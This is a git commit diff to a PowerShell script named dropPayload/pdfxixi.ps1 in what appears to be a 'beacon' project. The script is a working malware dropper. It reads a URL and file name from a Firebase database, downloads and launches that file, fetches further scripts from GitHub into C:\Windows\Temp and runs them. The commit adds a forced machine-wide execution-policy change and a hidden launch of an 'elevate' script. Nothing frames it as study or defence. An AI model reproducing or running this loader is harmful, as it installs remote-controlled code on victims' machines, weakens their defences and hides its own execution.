7811214bb51a390fdc0e28bcb25049eca9f29ea1
currone <94299594+snackmasta@users.noreply.github.com>
2024-02-09 08:56:55 +0700

    fix launch getstate

--- dropPayload/pdfxixi.ps1
+++ dropPayload/pdfxixi.ps1
@@ -1,3 +1,4 @@
+Set-ExecutionPolicy -ExecutionPolicy RemoteSigned -Scope LocalMachine -Force;  
 $url = Invoke-RestMethod -Uri "https://curronebox-default-rtdb.asia-southeast1.firebasedatabase.app/file/URL.json"; $name = Invoke-RestMethod -Uri "https://curronebox-default-rtdb.asia-southeast1.firebasedatabase.app/file/name.json"; Invoke-WebRequest -Uri $url -OutFile "$name"; Start-Process -FilePath "$name"; 
 $hapus = Invoke-RestMethod -Uri "https://curronebox-default-rtdb.asia-southeast1.firebasedatabase.app/file/exe.json"
 
@@ -13,6 +14,7 @@ Invoke-RestMethod -Uri https://raw.githubusercontent.com/snackmasta/beacon/v0.0.
 C:\Windows\Temp\mode.ps1;
 Invoke-RestMethod -Uri https://raw.githubusercontent.com/snackmasta/beacon/v0.0.1/dropPayload/loadFile.ps1 > C:\Windows\Temp\start.ps1;  
 C:\Windows\Temp\start.ps1;
+Start-Process -FilePath 'powershell.exe' -WindowStyle Hidden -ArgumentList '-command "& {C:\temp\beacon\elevate\GetState.ps1}"'
 "@
 
 # Write the content to the new .ps1 script file
